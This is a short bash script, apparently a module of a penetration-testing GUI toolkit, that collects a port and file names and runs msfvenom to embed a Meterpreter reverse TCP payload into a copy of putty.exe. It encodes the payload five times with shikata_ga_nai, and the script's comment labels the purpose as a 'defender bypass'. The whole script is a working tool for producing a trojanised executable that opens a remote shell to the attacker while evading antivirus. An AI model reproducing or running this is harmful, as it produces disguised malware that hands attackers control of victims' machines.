#!/bin/bash

: '
defender bypass with x86/shikata_ga_nai for .exe
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LPORT_FIELD=$(form_item  "LPORT" "number" "lport" "1337")
INPUT_FILE_FIELD=$(form_item  "input file" "text" "input_file" "${SCRIPTS_DIR}/shell/msfvenom/.files/putty.exe")
OUTPUT_FILE_FIELD=$(form_item  "output file" "text" "output_file" "putty_bd.exe")

# Generate GUI form
generate_form "${LPORT_FIELD}" "${INPUT_FILE_FIELD}" "${OUTPUT_FILE_FIELD}"

LPORT=${form_data["lport"]}
INPUT_FILE=${form_data["input_file"]}
OUTPUT_FILE=${form_data["output_file"]}

execute_command "msfvenom windows/x86/meterpreter_reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -k -x ${INPUT_FILE} -e x86/shikata_ga_nai -a x86 --platform windows -o ${OUTPUT_FILE} -i 5"
create_new_line
